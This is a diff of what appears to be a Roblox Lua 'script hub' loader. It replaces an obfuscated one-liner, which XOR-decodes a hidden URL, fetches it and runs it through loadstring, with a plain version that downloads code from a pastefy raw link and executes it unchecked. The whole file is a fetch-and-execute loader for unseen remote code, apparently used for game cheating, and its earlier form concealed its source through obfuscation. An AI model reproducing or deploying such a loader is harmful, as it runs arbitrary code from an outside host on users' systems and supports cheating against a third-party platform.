@@ -1,1 +1,20 @@
-do local a=game;local b=pcall;local c=loadstring;local d=string.char;local e=function(t,k)local r=""for i=1,#t do r=r..d(bit32.bxor(t[i],k))end return r end;local f={51,34,34,50,41,113,113,42,36,54,33,52,63,44,113,36,33,33,113,24,7,3,16,33,36,2,16,33,113,51,36,50};local g=function()local h=a:HttpGet(e(f,95));if h and#h>0 then local i,j=c(h);if i then i()else error(j)end else error("x")end end;local k,l=b(g);if not k then warn(l)end end
+-- 420 HUB LOADER (FIXED)
+
+local pastefy = "https://pastefy.app/SRYZcfAY/raw"
+
+local ok, src = pcall(function()
+    return game:HttpGet(pastefy)
+end)
+
+if not ok then
+    warn("HTTP FAILED")
+    return
+end
+
+local run, err = loadstring(src)
+if not run then
+    warn(err)
+    return
+end
+
+run()
